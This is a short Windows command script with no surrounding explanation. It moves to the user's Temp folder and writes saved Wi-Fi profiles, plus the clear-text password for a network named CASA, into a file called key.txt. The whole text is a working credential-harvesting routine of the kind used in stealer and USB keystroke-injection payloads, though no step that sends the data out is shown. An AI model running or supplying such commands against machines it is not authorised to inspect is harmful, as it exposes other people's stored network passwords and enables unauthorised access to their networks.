cd AppData\Local\Temp
netsh wlan show profile > key.txt
netsh wlan show profile name=CASA key=clear >> key.txt
cd
